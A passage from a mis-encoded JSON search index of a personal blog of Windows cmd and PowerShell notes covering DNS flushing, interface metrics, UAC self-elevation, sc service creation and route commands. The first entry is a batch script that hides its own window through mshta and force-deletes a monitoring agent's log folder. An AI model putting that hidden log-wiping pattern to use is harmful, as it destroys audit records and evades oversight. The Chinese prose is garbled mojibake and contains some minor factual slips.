é™¤æ–‡ä»¶å¤¹","date":"2023-10-27T01:24:01.984Z","path":"A_OS/Windows/cmd/ã€windowsã€‘ã€cmdã€‘åˆ é™¤æ–‡ä»¶å¤¹/","text":"12345678@echo offif &quot;%1&quot; == &quot;h&quot; goto beginmshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;%~nx0&quot;&quot; h&quot;,0)(window.close)&amp;&amp;exit:beginREMrd /Q /S %programdata%\\TrustAgent\\logs","tags":[{"name":"windows/bat","slug":"windows-bat","permalink":"https://hodlyounger.github.io/tags/windows-bat/"},{"name":"windows/æ–‡ä»¶å¤¹","slug":"windows-æ–‡ä»¶å¤¹","permalink":"https://hodlyounger.github.io/tags/windows-%E6%96%87%E4%BB%B6%E5%A4%B9/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/cmd/"}]},{"title":"ã€windowsã€‘ã€cmdã€‘æ¸…ç†DNSç¼“å­˜","date":"2023-10-27T01:24:01.984Z","path":"A_OS/Windows/cmd/ã€windowsã€‘ã€cmdã€‘æ¸…ç†DNSç¼“å­˜/","text":"åœ¨Windowsç³»ç»Ÿä¸Šæ¸…ç†DNSç¼“å­˜æœ‰å‡ ç§æ–¹æ³•ï¼Œä»¥ä¸‹æ˜¯å…¶ä¸­ä¸¤ç§å¸¸ç”¨çš„æ–¹æ³•ï¼š æ–¹æ³•ä¸€ï¼šä½¿ç”¨ipconfigå‘½ä»¤ æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼šæŒ‰ä¸‹Win + Ré”®ï¼Œåœ¨è¿è¡Œå¯¹è¯æ¡†ä¸­è¾“å…¥cmdï¼Œç„¶åæŒ‰ä¸‹å›è½¦é”®ã€‚ åœ¨å‘½ä»¤æç¤ºç¬¦çª—å£ä¸­ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤å¹¶æŒ‰ä¸‹å›è½¦é”®ï¼š 1ipconfig /flushdns è¿™å°†æ¸…é™¤æœ¬åœ°è®¡ç®—æœºä¸Šçš„DNSç¼“å­˜ã€‚ åœ¨å‘½ä»¤æç¤ºç¬¦çª—å£ä¸­ï¼Œæ‚¨å°†çœ‹åˆ°ä¸€æ¡æ¶ˆæ¯æç¤º&quot;DNS Resolver Cache successfully flushed&quot;ï¼Œè¡¨æ˜DNSç¼“å­˜å·²æˆåŠŸæ¸…é™¤ã€‚ æ–¹æ³•äºŒï¼šä½¿ç”¨å‘½ä»¤æç¤ºç¬¦å’Œnetshå‘½ä»¤ æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼šæŒ‰ä¸‹Win + Ré”®ï¼Œåœ¨è¿è¡Œå¯¹è¯æ¡†ä¸­è¾“å…¥cmdï¼Œç„¶åæŒ‰ä¸‹å›è½¦é”®ã€‚ åœ¨å‘½ä»¤æç¤ºç¬¦çª—å£ä¸­ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤å¹¶æŒ‰ä¸‹å›è½¦é”®ï¼š 1netsh winsock reset è¿™å°†é‡ç½®Winsockç›®å½•ï¼Œå¹¶æ¸…é™¤DNSç¼“å­˜ã€‚ åœ¨å‘½ä»¤æç¤ºç¬¦çª—å£ä¸­ï¼Œæ‚¨å°†çœ‹åˆ°ä¸€æ¡æ¶ˆæ¯æç¤º&quot;Successfully reset the Winsock Catalog&quot;ï¼Œè¡¨æ˜Winsockç›®å½•å·²æˆåŠŸé‡ç½®ã€‚ åœ¨å‘½ä»¤æç¤ºç¬¦çª—å£ä¸­ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤å¹¶æŒ‰ä¸‹å›è½¦é”®ï¼š 1ipconfig /flushdns è¿™å°†æ¸…é™¤æœ¬åœ°è®¡ç®—æœºä¸Šçš„DNSç¼“å­˜ã€‚ åœ¨å‘½ä»¤æç¤ºç¬¦çª—å£ä¸­ï¼Œæ‚¨å°†çœ‹åˆ°ä¸€æ¡æ¶ˆæ¯æç¤º&quot;DNS Resolver Cache successfully flushed&quot;ï¼Œè¡¨æ˜DNSç¼“å­˜å·²æˆåŠŸæ¸…é™¤ã€‚ æ— è®ºä½¿ç”¨å“ªç§æ–¹æ³•ï¼Œéƒ½éœ€è¦ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œå‘½ä»¤æç¤ºç¬¦çª—å£ï¼ˆå³é”®ç‚¹å‡»å‘½ä»¤æç¤ºç¬¦å›¾æ ‡ï¼Œé€‰æ‹©&quot;ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ&quot;ï¼‰æ‰èƒ½æ‰§è¡Œæ¸…é™¤DNSç¼“å­˜çš„å‘½ä»¤ã€‚ å¸Œæœ›è¿™äº›æ­¥éª¤èƒ½å¤Ÿå¸®åŠ©æ‚¨æ¸…ç†Windowsç³»ç»Ÿä¸Šçš„DNSç¼“å­˜ã€‚","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"windows/cmd","slug":"windows-cmd","permalink":"https://hodlyounger.github.io/tags/windows-cmd/"},{"name":"DNS","slug":"DNS","permalink":"https://hodlyounger.github.io/tags/DNS/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/cmd/"}]},{"title":"ã€windowsã€‘ã€cmdã€‘ä¿®æ”¹ç½‘ç»œé…ç½®çš„ InterfaceMetric","date":"2023-10-27T01:24:01.983Z","path":"A_OS/Windows/cmd/ä¿®æ”¹ipæ¥å£çš„è·ƒç‚¹æ•°/","text":"ä½¿ç”¨è„šæœ¬ä¿®æ”¹ç½‘å¡è·ƒç‚¹æ•° InterfaceMetric ä½¿ç”¨åˆ°çš„æ¥å£ Get-NetIPInterface Set-NetIPInterface Get-NetAdapter éœ€æ±‚æè¿° éœ€è¦ä¿®æ”¹å½“å‰è·ƒç‚¹æ•°ä¸º 1 çš„ipæ¥å£ï¼Œä¿®æ”¹å…¶è·ƒç‚¹æ•°ä¸º 90 è§£å†³æ–¹æ¡ˆ è®¾ç½®ipæ¥å£çš„è·ƒç‚¹æ•°å‡éœ€è¦ç®¡ç†å‘˜æƒé™ æ€è·¯ä¸€ æºæ–‡ä»¶ é€šè¿‡ Get-NetIPInterface è·å–éœ€è¦ä¿®æ”¹çš„IPæ¥å£ é€šè¿‡ Set-NetIPInterface ä¿®æ”¹è·ƒç‚¹æ•° 12345678910111213$ChangeIfm = 1$WangToChangeIfm = 90# è·å– InterfaceMetric ä¸º 1 çš„ -InterfaceIndex$NetCard = (Get-NetIPInterface -InterfaceMetric $ChangeIfm).ifAlias$netInterfaceIndex = (Get-NetIPInterface -AddressFamily IPv4 -InterfaceMetric $ChangeIfm).ifIndexWrite-Output &quot;æ£€ç´¢InterfaceMetricä¸º [$&#123;ChangeIfm&#125;] åˆ—è¡¨: `n $&#123;NetCard&#125;&quot;Write-Output &quot;Index ä¸º: $&#123;netInterfaceIndex&#125;&quot;Set-NetIPInterface -InterfaceIndex $netInterfaceIndex -InterfaceMetric $WangToChangeIfmWrite-Output &quot;å·²ä¿®æ”¹ $&#123;NetCard&#125; çš„ InterfaceMetric ä¸º $&#123;WangToChangeIfm&#125;&quot; æ€è·¯äºŒ æºæ–‡ä»¶ ä½¿ç”¨è¿‡æ»¤å™¨ç­›é€‰éœ€è¦ä¿®æ”¹çš„ipæ¥å£ï¼Œå†é€šè¿‡ Set-NetIPInterface ä¿®æ”¹è·ƒç‚¹æ•° 12345678# è·å– InterfaceMetric ä¸º 1 çš„ -InterfaceIndex$NetCard = (Get-NetAdapter | Where-Object -FilterScript &#123;$_.ifIndex -eq 10&#125;)Write-Output $NetCardSet-NetIPInterface -InterfaceIndex $NetCard.ifIndex -AddressFamily IPv6 -InterfaceMetric 90 å®˜æ–¹demo ä¿®æ”¹ LinkSpeed ä¸º 100 Mbps çš„ç½‘ç»œçš„ InterfaceMetric ä¸º 21 1Get-NetAdapter | Where-Object -FilterScript &#123;$_.LinkSpeed -Eq &quot;100 Mbps&quot;&#125; | Set-NetIPInterface -InterfaceMetric 21 æå‡ç®¡ç†å‘˜æƒé™ cmdææƒ 1234567891011@echo off::1 è·å–ç®¡ç†å‘˜æƒé™%1 mshta vbscript:CreateObject(&quot;Shell.Application&quot;).ShellExecute(&quot;cmd.exe&quot;,&quot;/c %~s0 ::&quot;,&quot;&quot;,&quot;runas&quot;,1)(window.close)&amp;&amp;exit::2 æ‰§è¡Œæ“ä½œset curpath=%~dp0set file=ModifyIfm.ps1set execPath=%curpath%%file%echo %execPath%powershell.exe -ExecutionPolicy ByPass -File %execPath% powershell ææƒ 1234567if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] &#x27;Administrator&#x27;)) &#123; if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) &#123; $Command = &quot;-File `&quot;&quot; + $MyInvocation.MyCommand.Path + &quot;`&quot; &quot; + $MyInvocation.UnboundArguments Start-Process -FilePath PowerShell.exe -Verb RunAs -ArgumentList $Command Exit &#125;&#125; InterfaceMetric æ˜¯ç”¨äºè¡¨ç¤ºç½‘ç»œæ¥å£ä¼˜å…ˆçº§çš„æŒ‡æ ‡ï¼Œå®ƒç”¨äºå†³å®šè®¡ç®—æœºåœ¨å¤šä¸ªç½‘ç»œæ¥å£ä¹‹é—´è¿›è¡Œç½‘ç»œé€šä¿¡æ—¶æ‰€é€‰æ‹©çš„é»˜è®¤æ¥å£ã€‚ åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­ï¼ŒInterfaceMetricæ˜¯ä¸€ä¸ªç”¨äºè·¯ç”±é€‰æ‹©å’Œæ¥å£ä¼˜å…ˆçº§çš„æ•´æ•°å€¼ã€‚è¾ƒä½çš„InterfaceMetricå€¼è¡¨ç¤ºè¾ƒé«˜çš„ä¼˜å…ˆçº§ï¼Œé€šå¸¸ä¼šè¢«é€‰æ‹©ä¸ºé»˜è®¤æ¥å£ã€‚ä»¥ä¸‹æ˜¯InterfaceMetricçš„ä¸€äº›å¸¸ç”¨æ•°å€¼åŠå…¶å«ä¹‰ï¼š 0ï¼šæœ€é«˜ä¼˜å…ˆçº§ã€‚å½“å­˜åœ¨å¤šä¸ªå¯ç”¨çš„æ¥å£æ—¶ï¼Œæ“ä½œç³»ç»Ÿå°†ä¼˜å…ˆä½¿ç”¨æ­¤æ¥å£è¿›è¡Œç½‘ç»œé€šä¿¡ã€‚ 5ï¼šè¾ƒé«˜ä¼˜å…ˆçº§ã€‚ä¼˜å…ˆçº§ç¨ä½äº0ï¼Œä½†ä»æ¯”è¾ƒé«˜ï¼Œé€šå¸¸ç”¨äºæŒ‡å®šé¦–é€‰æ¥å£ã€‚ 10ï¼šé»˜è®¤ä¼˜å…ˆçº§ã€‚å¦‚æœæ²¡æœ‰ç‰¹æ®ŠæŒ‡å®šä¼˜å…ˆçº§çš„æƒ…å†µä¸‹ï¼Œæ“ä½œç³»ç»Ÿé€šå¸¸å°†é€‰æ‹©InterfaceMetricä¸º10çš„æ¥å£ä½œä¸ºé»˜è®¤æ¥å£ã€‚ å¤§äº10çš„å€¼ï¼šè¾ƒä½ä¼˜å…ˆçº§ã€‚è¿™äº›å€¼è¡¨ç¤ºæ¥å£çš„ä¼˜å…ˆçº§è¾ƒä½ï¼Œåªæœ‰åœ¨æ²¡æœ‰æ›´é«˜ä¼˜å…ˆçº§çš„æ¥å£å¯ç”¨æ—¶æ‰è¢«é€‰æ‹©ã€‚ è¯·æ³¨æ„ï¼ŒInterfaceMetricå€¼åªåœ¨æœ‰å¤šä¸ªå¯ç”¨çš„ç½‘ç»œæ¥å£æ—¶æ‰èµ·ä½œç”¨ã€‚å¦‚æœåªæœ‰ä¸€ä¸ªæ¥å£å¯ç”¨ï¼Œåˆ™æ— è®ºInterfaceMetricçš„å€¼å¦‚ä½•ï¼Œè¯¥æ¥å£éƒ½å°†è¢«é€‰æ‹©ä¸ºé»˜è®¤æ¥å£ã€‚ æ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤åœ¨Windowsç³»ç»Ÿä¸­ä¿®æ”¹æ¥å£çš„InterfaceMetricå€¼ï¼š æ‰“å¼€ç½‘ç»œè¿æ¥è®¾ç½®ï¼šåœ¨Windowsæœç´¢æ ä¸­è¾“å…¥&quot;æ§åˆ¶é¢æ¿&quot;ï¼Œæ‰“å¼€æ§åˆ¶é¢æ¿åé€‰æ‹©&quot;ç½‘ç»œå’Œ Internet&quot;ï¼Œç„¶åé€‰æ‹©&quot;ç½‘ç»œå’Œå…±äº«ä¸­å¿ƒ&quot;ã€‚ æ‰“å¼€é€‚é…å™¨è®¾ç½®ï¼šåœ¨å·¦ä¾§é¢æ¿ä¸­ï¼Œç‚¹å‡»&quot;æ›´æ”¹é€‚é…å™¨è®¾ç½®&quot;ã€‚ æ‰¾åˆ°ç½‘ç»œæ¥å£ï¼šåœ¨é€‚é…å™¨è®¾ç½®çª—å£ä¸­ï¼Œæ‰¾åˆ°è¦ä¿®æ”¹InterfaceMetricçš„ç½‘ç»œæ¥å£ï¼Œå³é”®ç‚¹å‡»è¯¥æ¥å£ï¼Œç„¶åé€‰æ‹©&quot;å±æ€§&quot;ã€‚ ä¿®æ”¹æ¥å£å±æ€§ï¼šåœ¨æ¥å£å±æ€§çª—å£ä¸­ï¼Œé€‰æ‹©&quot;Internet åè®®ç‰ˆæœ¬ 4 (TCP/IPv4)&quot;ï¼ˆæˆ–å…¶ä»–é€‚ç”¨çš„åè®®ç‰ˆæœ¬ï¼‰ï¼Œç„¶åç‚¹å‡»&quot;å±æ€§&quot;æŒ‰é’®ã€‚ ä¿®æ”¹InterfaceMetricå€¼ï¼šåœ¨è¯¥æ¥å£çš„å±æ€§çª—å£ä¸­ï¼Œç‚¹å‡»&quot;é«˜çº§&quot;æŒ‰é’®ï¼Œåœ¨&quot;é€‚é…å™¨åº¦é‡&quot;éƒ¨åˆ†ï¼Œå¯ä»¥æ‰‹åŠ¨è¾“å…¥æƒ³è¦è®¾ç½®çš„InterfaceMetricå€¼ï¼ˆæ•´æ•°ï¼‰ã€‚ ä¿å­˜è®¾ç½®ï¼šä¿å­˜ä¿®æ”¹åçš„è®¾ç½®ï¼Œç„¶åå…³é—­æ‰€æœ‰çª—å£ã€‚ æ³¨æ„ï¼šæ›´æ”¹InterfaceMetricå€¼åï¼Œå¯èƒ½éœ€è¦é‡å¯è®¡ç®—æœºæˆ–è€…å¯ç”¨/ç¦ç”¨ç½‘ç»œæ¥å£æ‰èƒ½ä½¿æ›´æ”¹ç”Ÿæ•ˆã€‚ å¸Œæœ›è¿™äº›ä¿¡æ¯èƒ½å¸®åŠ©æ‚¨ç†è§£InterfaceMetricçš„å«ä¹‰åŠå…¶åœ¨Windowsç³»ç»Ÿä¸­ä½¿ç”¨çš„æ–¹å¼ã€‚","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/cmd/"}]},{"title":"ã€cmdã€‘ scåˆ›å»ºæœåŠ¡","date":"2023-10-27T01:24:01.982Z","path":"A_OS/Windows/cmd/scåˆ›å»ºæœåŠ¡/","text":"æ¦‚è¿°ï¼šscå‘½ä»¤çš„ä½¿ç”¨|åˆ›å»ºæœåŠ¡ [toc] sc åˆ›å»ºæœåŠ¡ å¦‚ä½•å°†exeæ³¨å†Œä¸ºwindowsæœåŠ¡ï¼Œè®©å…¶ç›´æ¥ä»åå°è¿è¡Œ å¸®åŠ©æ‰‹å†Œ sc create /? æ–¹æ³•ä¸€ï¼šä½¿ç”¨windowsè‡ªå¸¦çš„å‘½ä»¤scï¼Œé¦–å…ˆæˆ‘ä»¬è¦ç”¨ç®¡ç†å‘˜è¿è¡Œcmd æ³¨å†ŒæœåŠ¡ï¼š 1sc create TestService binpath= &quot;D:\\Test\\TestService.exe&quot; start= auto displayname= &quot;TestService&quot; æ³¨æ„ï¼šæ‰€æœ‰çš„ç­‰å·å’Œå€¼ä¹‹é—´éœ€è¦ä¸€ä¸ªç©ºæ ¼ï¼ˆç­‰å·å‰ä¸è¦ç©ºæ ¼ï¼Œç­‰å·åè¦ä¸€ä¸ªç©ºæ ¼ï¼‰ï¼ï¼ binpathå’Œç­‰å·ä¹‹é—´ä¸è¦ç©ºæ ¼ï¼Œç­‰å·å’Œå®‰è£…è·¯å¾„ï¼ˆä¾‹å¦‚*â€œbinpath= D:\\Test\\TestService.exeâ€*ï¼‰ä¹‹é—´è¦ç©ºæ ¼ binpathï¼šä½ çš„åº”ç”¨ç¨‹åºæ‰€åœ¨çš„è·¯å¾„ã€‚ displaynameï¼šæœåŠ¡æ˜¾ç¤ºçš„åç§°ã€‚ descriptionï¼šæœåŠ¡æè¿°è¯´æ˜ã€‚ å¦‚ä½•åˆ¤æ–­æœåŠ¡æ˜¯å¦æ³¨å†ŒæˆåŠŸï¼š åœ¨cmdä¸­è¾“å…¥services.mscæ‰“å¼€ç³»ç»ŸæœåŠ¡ï¼ŒæŸ¥çœ‹æ˜¯å¦å‡ºç°TestServiceåç§°çš„æœåŠ¡ï¼ˆå³displayname=åé¢çš„å‚æ•°ï¼Œæˆ‘è¿™é‡Œæ˜¯TestServiceï¼‰ ä¿®æ”¹æè¿°ï¼š 1sc description TestService &quot;è¿™æ˜¯ä¸€ä¸ªWindowsæµ‹è¯•æœåŠ¡ã€‚&quot; å¯åŠ¨æœåŠ¡ï¼š 1net start TestService åœæ­¢æœåŠ¡ï¼š 1net stop TestService åˆ é™¤æœåŠ¡ï¼š 1sc delete TestService SCå‘½ä»¤çš„æ›´å¤šç”¨æ³•è¯·åœ¨æŸ¥çœ‹help sc ä½¿ç”¨æ—¶æˆ‘ä»¬ä¸€èˆ¬ç”¨ä¸ªæ–‡æœ¬æ–‡æ¡£å†™å…¥å‘½ä»¤ç„¶åä¿å­˜æˆbatæ ¼å¼çš„æ–‡ä»¶ï¼Œæ·»åŠ æœåŠ¡ä¸€ä¸ªï¼Œåˆ é™¤æœåŠ¡ä¸€ä¸ªã€‚ ä¾‹å¦‚â€œæ·»åŠ æœåŠ¡.batâ€å†…å®¹å¦‚ä¸‹ï¼š 1234567sc create TestService binpath= &quot;D:\\TestApp\\TestService.exe&quot; sc description TestService &quot;è¿™æ˜¯ä¸€ä¸ªWindowsæµ‹è¯•æœåŠ¡ã€‚&quot; net start TestService pause â€œåˆ é™¤æœåŠ¡.batâ€å†…å®¹å¦‚ä¸‹ï¼š 123net stop TestService sc delete TestService æ–¹æ³•äºŒï¼š æ— æ³•ä»å‘½ä»¤è¡Œæˆ–è°ƒè¯•å™¨å¯åŠ¨æœåŠ¡ï¼Œå¿…é¡»é¦–å…ˆå®‰è£…WindowsæœåŠ¡(ä½¿ç”¨installutil.exe),ç„¶åç”¨ServerExplorerã€WindowsæœåŠ¡å™¨ç®¡ç†å·¥å…·æˆ–NET STARTå‘½ä»¤å¯åŠ¨å®ƒ ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œcmd å®‰è£…windowsæœåŠ¡ 1cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319(InstallUtil.exeçš„è·¯å¾„ï¼Œæ³¨æ„InstallUtil.exeçš„ç‰ˆæœ¬å·éœ€è¦å’Œé¡¹ç›®çš„ç‰ˆæœ¬å·ç›¸åŒ) å®‰è£…windowsæœåŠ¡ 1InstallUtil.exe D:\\Service\\éœ€è¦å®‰è£…çš„æœåŠ¡.exe(é¡¹ç›®çš„è·¯å¾„) å¯åŠ¨windowsæœåŠ¡ 1net start TestServive(æœåŠ¡åç§°)","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"Windows/cmd","slug":"Windows-cmd","permalink":"https://hodlyounger.github.io/tags/Windows-cmd/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/cmd/"}]},{"title":"ã€cmdã€‘route","date":"2023-10-27T01:24:01.981Z","path":"A_OS/Windows/cmd/ã€cmdã€‘route/","text":"æ¦‚è¿°ï¼šwindows routeå‘½ä»¤çš„ç”¨æ³•|æŸ¥çœ‹è·¯ç”±|ä¿®æ”¹è·¯ç”±|åˆ é™¤è·¯ç”± Route å‘½ä»¤ Routeå‘½ä»¤ç”¨äºåœ¨æœ¬åœ°IPè·¯ç”±è¡¨ä¸­æ˜¾ç¤ºå’Œä¿®æ”¹æ¡ç›®ã€‚åœ¨æ’é™¤ç½‘ç»œæ•…éšœæ—¶å¸¸ä¼šç”¨åˆ°ã€‚ ä½¿ç”¨ä¸å¸¦å‚æ•°çš„Routeæˆ– Route /? å¯ä»¥æ˜¾ç¤ºå¸®åŠ©ã€‚ è¯­æ³•ï¼š route [-f] [-p] [command [destination] [mask netmask] [gateway] [metric] [if interface] -f é€‰é¡¹ Route â€“f å‘½ä»¤æ¸…é™¤æ‰€æœ‰ç½‘å…³é¡¹çš„è·¯ç”±è¡¨ã€‚å¦‚æœè¯¥å‚æ•°ä¸æŸä¸ªå‘½ä»¤ç»„åˆä½¿ç”¨ï¼Œè·¯ç”±è¡¨å°†åœ¨è¿è¡Œå‘½ä»¤å‰æ¸…é™¤ã€‚ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ‰§è¡Œ route â€“f å‘½ä»¤åï¼Œå†ç”¨ route print æ‰“å°è·¯ç”±è¡¨æ—¶ï¼Œå¯çœ‹åˆ°è·¯ç”±è¡¨ä¸ºç©ºã€‚ -p é€‰é¡¹ ä¸ route add å‘½ä»¤ç»“åˆä½¿ç”¨æ—¶ï¼Œå°†è·¯ç”±è®¾å¤‡ä¸ºåœ¨ç³»ç»Ÿå¼•å¯¼æœŸé—´ä¿æŒä¸å˜ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œé‡æ–°å¯åŠ¨ç³»ç»Ÿæ—¶ï¼Œä¸ä¿å­˜è·¯ç”±ã€‚ å½“åœ¨ route add å‘½ä»¤ä¸­åŠ å…¥-på‚æ•°æ—¶ï¼Œroute print å‘½ä»¤å°±èƒ½çœ‹åˆ°æ°¸ä¹…è·¯ç”±äº†ã€‚ route print Printå‘½ä»¤ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†ä»‹ç»Printã€Addã€Deleteã€Chanceå››ä¸ªå¸¸ç”¨çš„Commandå‘½ä»¤ã€‚ Route printå‘½ä»¤æ˜¾ç¤ºIPè·¯ç”±è¡¨çš„å®Œæ•´å†…å®¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼šé¦–å…ˆæ˜¾ç¤ºäº†å½“å‰ä¸»æœºçš„æ‰€æœ‰æ¥å£åˆ—è¡¨ï¼Œæ¥ä¸‹æ¥æ˜¾ç¤ºIPv4è·¯ç”±è¡¨å’ŒIPv4æ°¸ä¹…è·¯ç”±ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘çš„IPv4è·¯ç”±è¡¨æœ‰ä¸¤ä¸ªé»˜è®¤ç½‘å…³ï¼Œä¸”æ— æ‰‹åŠ¨æ·»åŠ çš„IPv4æ°¸ä¹…è·¯ç”±ã€‚ ä½¿ç”¨route printå‘½ä»¤æ—¶ï¼Œç›®æ ‡æˆ–ç½‘å…³å¯ä»¥ä¸ºé€šé…ç¬¦ï¼Œé€šé…ç¬¦æŒ‡å®šä¸ºæ˜Ÿå·â€œ*â€ã€‚ 12345Route print -4 #å‘½ä»¤åªæ˜¾ç¤ºIPv4çš„è·¯ç”±è¡¨ä¿¡æ¯ã€‚Route print -6 #å‘½ä»¤åªæ˜¾ç¤ºIPv6çš„è·¯ç”±è¡¨ä¿¡æ¯ã€‚Route print 192* #å‘½ä»¤åªæ˜¾ç¤ºé‚£äº›åŒ¹é…192*çš„é¡¹ã€‚ route add ä¾‹1ï¼šè‹¥è¦æ·»åŠ å¸¦æœ‰ 192.168.12.1 é»˜è®¤ç½‘å…³åœ°å€çš„é»˜è®¤è·¯ç”±ï¼Œ 1route add 0.0.0.0 mask 0.0.0.0 192.168.12.1 ä¾‹2ï¼šè‹¥è¦å‘å¸¦æœ‰ 255.255.0.0 å­ç½‘æ©ç å’Œ 10.27.0.1 ä¸‹ä¸€è·ƒç‚¹åœ°å€çš„ 10.41.0.0 ç›®æ ‡ä¸­æ·»åŠ ä¸€ä¸ªè·¯ç”± 1route add 10.41.0.0 mask 255.255.0.0 10.27.0.1 ä¾‹3ï¼šè‹¥è¦å‘å¸¦æœ‰ 255.255.0.0 å­ç½‘æ©ç å’Œ 10.27.0.1 ä¸‹ä¸€è·ƒç‚¹åœ°å€çš„ 10.41.0.0 ç›®æ ‡ä¸­æ·»åŠ ä¸€ä¸ªæ°¸ä¹…è·¯ç”± 1route -p add 10.41.0.0 mask 255.255.0.0 10.27.0.1 ä¾‹4ï¼šè‹¥è¦å‘å¸¦æœ‰ 255.255.0.0 å­ç½‘æ©ç ã€10.27.0.1 ä¸‹ä¸€è·ƒç‚¹åœ°å€ä¸”å…¶æˆæœ¬å€¼æ ‡ä¸º 7 çš„ 10.41.0.0 ç›®æ ‡ä¸­æ·»åŠ ä¸€ä¸ªè·¯ç”± 1route add 10.41.0.0 mask 255.255.0.0 10.27.0.1 metric 7 ä¾‹5ï¼šè‹¥è¦å‘å¸¦æœ‰ 255.255.0.0 å­ç½‘æ©ç ã€10.27.0.1 ä¸‹ä¸€è·ƒç‚¹åœ°å€ä¸”ä½¿ç”¨ 0x3 æ¥å£ç´¢å¼•çš„ 10.41.0.0 ç›®æ ‡ä¸­æ·»åŠ ä¸€ä¸ªè·¯ç”± 1route add 10.41.0.0 mask 255.255.0.0 10.27.0.1 if 0x3 å¦‚æœæœªç»™å‡ºifï¼Œå®ƒå°†å°è¯•æŸ¥æ‰¾ç»™å®šç½‘å…³çš„æœ€ä½³æ¥å£ã€‚ ä¾‹6ï¼šè‹¥æœ¬åœ°çš„IPåœ°å€ä¸º172.16.1.100ï¼Œç½‘å…³ä¸º172.16.1.254ï¼Œç°æœ‰ä¸€æ¡ADSLçº¿è·¯ï¼Œè·¯ç”±å™¨çš„åœ°å€ä¸º172.168.1.200ï¼Œé€šè¿‡è¯¥åœ°å€å¯è®¿é—®Internetã€‚å¦‚ä½•åšåˆ°æ—¢æƒ³ä¸Šç½‘ï¼Œåˆæƒ³è®¿é—®ç½‘ç»œå†…çš„èµ„æºï¼Ÿåªéœ€æŒ‰ä»¥ä¸‹ä¸‰æ­¥æ“ä½œå³å¯ 12345ç¬¬ä¸€æ­¥ï¼šå°†æœ¬åœ°çš„ç½‘å…³åœ°å€ç”±172.16.1.254æ”¹ä¸º172.16.1.200ç¬¬äºŒæ­¥ï¼šroute delete 0.0.0.0 mask 0.0.0.0 172.16.1.254ç¬¬ä¸‰æ­¥ï¼šroute add 172.16.0.0 mask 255.255.0.0 172.16.1.100 -p metric 1 Deleteå‘½ä»¤ Route deleteå‘½ä»¤åˆ é™¤è·¯ç”±ã€‚ ä½¿ç”¨route deleteå‘½ä»¤æ—¶ï¼Œç›®æ ‡æˆ–ç½‘å…³å¯ä»¥ä¸ºé€šé…ç¬¦ï¼Œé€šé…ç¬¦æŒ‡å®šä¸ºæ˜Ÿå·â€œ*â€ã€‚ ä¾‹1ï¼šè‹¥è¦åˆ é™¤åˆ°å¸¦æœ‰ 255.255.0.0 å­ç½‘æ©ç çš„ 10.41.0.0 ç›®æ ‡çš„è·¯ç”± 1route delete 10.41.0.0 mask 255.255.0.0 ä¾‹2ï¼šè‹¥è¦åˆ é™¤ä»¥ 10. èµ·å§‹çš„ IP è·¯ç”±è¡¨ä¸­çš„æ‰€æœ‰è·¯ç”± 1route delete 10.\\* Changeå‘½ä»¤ Route changeå‘½ä»¤åªç”¨äºä¿®æ”¹ç½‘å…³å’Œ/æˆ–è·ƒç‚¹æ•° ä¾‹1ï¼šè‹¥è¦å°†å¸¦æœ‰ 10.100.0.0 ç›®æ ‡å’Œ 255.255.0.0 å­ç½‘æ©ç çš„ä¸‹ä¸€è·ƒç‚¹åœ°å€ä» 10.100.0.1 ä¿®æ”¹ä¸º 10.100.0.254 1route change 10.100.0.0 mask 255.255.0.0 10.100.0.254","tags":[{"name":"Windows/cmd","slug":"Windows-cmd","permalink":"https://hodlyounger.github.io/tags/Windows-cmd/"},{"name":"route","slug":"route","permalink":"https://hodlyounger.github.io/tags/route/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/cmd/"}]},{"title":"ã€ä¸€æ–‡ææ‡‚ã€‘ã€CMDã